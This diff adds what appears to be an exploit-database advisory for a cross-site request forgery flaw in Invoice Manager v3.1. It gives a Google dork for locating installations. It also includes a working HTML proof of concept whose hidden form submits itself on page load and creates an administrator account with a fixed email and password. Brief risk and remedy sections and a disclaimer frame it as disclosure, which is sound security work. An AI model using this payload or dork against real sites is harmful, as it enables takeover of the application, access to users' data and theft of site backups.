@@ -1,0 +1,73 @@
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+
+<!-- 
+# Exploit Title: Invoice Manager v3.1 - Cross site request forgery (Add Admin)
+# Exploit Author: Ali BawazeEer || https://sa.linkedin.com/in/alibawazeeer
+# Dork: inurl:controller=pjAdmin
+# Date: 30.08.2017
+# Homepage: https://www.phpjabbers.com/invoice-manager/
+# Software Demo Link: http://demo.phpjabbers.com/1504048815_513/index.php?controller=pjAdmin&action=pjActionLogin
+# Version: 3.1
+# Category: Webapps /php 
+# Tested on: mozila firefox 
+# 
+#
+-->
+
+# ========================================================
+#
+#
+# Invoice Manager v3.1 Cross site request forgery (Add Admin)
+# 
+# Description : Invoice Manager v3.1 is vulnerable to CSRF attack (No CSRF token in place) which if an admin user can be
+# tricked to visit a crafted URL created by attacker (via spear phishing/social engineering).
+# Once exploited, the attacker can login as the admin using the email and the password in the below exploit.
+#
+#
+# ======================CSRF POC (Adding New user with Administrator Privileges)==================================
+
+
+<html>
+<body>
+<form name="csrf_form" action="http://localhost/invoice/index.php?controller=pjAdminUsers&action=pjActionCreate" method="post">
+
+<input name="user_create" id="user_create" value="1" type="hidden">
+<input name="role_id" id="role_id" value="1" type="hidden" >
+<input name="email" id="email" value="AliBawazeEer@localhost.com" type="hidden">
+<input name="password" id="password" value="12341234" type="hidden">
+<input name="name" id="name" value="Ali BawazeEer" type="hidden">
+<input name="phone" id="phone" value="911911911" type="hidden">
+<input name="status" id="status" value="T" type="hidden">
+<script type="text/javascript">document.csrf_form.submit();</script>
+</body>
+</html>
+
+# =================================================EOF =======================================================
+#
+#
+# Risk : attackers are able to gain full access to the administrator panel after chaning the password for the admin
+# and thus have total control over the web application, including content change,and change user's account download backup of the site access to user's data..
+#
+#
+# Remedy : developer should implement CSRF token for each request  
+#
+#
+#
+# ========================================================
+# [+] Disclaimer
+#
+# Permission is hereby granted for the redistribution of this advisory,
+# provided that it is not altered except by reformatting it, and that due
+# credit is given. Permission is explicitly given for insertion in
+# vulnerability databases and similar, provided that due credit is given to
+# the author. The author is not responsible for any misuse of the information contained 
+# herein and prohibits any malicious use of all security related information
+# or exploits by the author or elsewhere.
+#
+#
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+
+
+
+
+
